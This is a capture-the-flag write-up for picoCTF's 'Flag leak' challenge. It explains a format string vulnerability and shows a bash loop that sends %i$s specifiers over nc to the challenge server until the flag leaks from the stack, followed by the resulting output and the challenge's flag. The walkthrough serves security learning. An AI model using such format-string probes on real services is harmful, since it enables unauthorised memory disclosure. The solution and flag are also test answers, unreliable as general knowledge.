# Flag leak
## Description
Story telling class 1/2
I'm just copying and pasting with this program. What can go wrong? You can view source here. And connect with it using:
nc saturn.picoctf.net 52373
## Solution
- Its under format stings which is a major hint. Since there are string vulnerabiltites that we can make use of.
- I tried looking at the code and gave various inputs to try and overflow the buffer but that didn't give the flag. We  need to take another approach.
- So first I tried giving %i$s where i is an integer(tried for a few values), I got meaningless strings, but surely there could be an element in the stack which is the string.
- Using for loops in linux shell, looked up the syntax. Did it to print 0-50 values in the stack, now obviously not all will have values but some strings might be printed hinting the flag.
- The for loop is just for changing the value in the format specifier instead of doing it manually. 
- In the end you can see it printed the flag.(you can use grep to get only the flag).
```bash
jenx5-picoctf@webshell:~$ for i in {0..50}; do echo "%$i\$s" | nc saturn.picoctf.net 52373; done
Tell me a story and then I'll tell you one >> Here's a story - 
%0$s
Tell me a story and then I'll tell you one >> Here's a story - 
%1$s
Tell me a story and then I'll tell you one >> Here's a story - 

Tell me a story and then I'll tell you one >> Here's a story - 
Ãº,
Tell me a story and then I'll tell you one >> Here's a story - 
Tell me a story and then I'll tell you one >> Here's a story - 
Tell me a story and then I'll tell you one >> Here's a story - 
(null)
Tell me a story and then I'll tell you one >> Here's a story - 
/
Tell me a story and then I'll tell you one >> Here's a story - 

Tell me a story and then I'll tell you one >> Here's a story - 
Tell me a story and then I'll tell you one >> Here's a story - 
(null)
Tell me a story and then I'll tell you one >> Here's a story - 
.
Tell me a story and then I'll tell you one >> Here's a story - 

Tell me a story and then I'll tell you one >> Here's a story - 
(null)
Tell me a story and then I'll tell you one >> Here's a story - 

Tell me a story and then I'll tell you one >> Here's a story - 

Tell me a story and then I'll tell you one >> Here's a story - 
(g8g8g8g8g8g8g8h8
Tell me a story and then I'll tell you one >> Here's a story - 
Tell me a story and then I'll tell you one >> Here's a story - 
(null)
Tell me a story and then I'll tell you one >> Here's a story - 
setresgid
Tell me a story and then I'll tell you one >> Here's a story - 

Tell me a story and then I'll tell you one >> Here's a story - 
e

Tell me a story and then I'll tell you one >> Here's a story - 
setresgid
Tell me a story and then I'll tell you one >> Here's a story - 

Tell me a story and then I'll tell you one >> Here's a story - 
CTF{L34k1ng_Fl4g_0ff_St4ck_11a2b52a}
Tell me a story and then I'll tell you one >> Here's a story - 
```
- I stopped the execution after I got the flag. If you don't it'll continue for more iterations which we don't really want. We just need the flag
> Flag: picoCTF{L34k1ng_Fl4g_0ff_St4ck_11a2b52a}
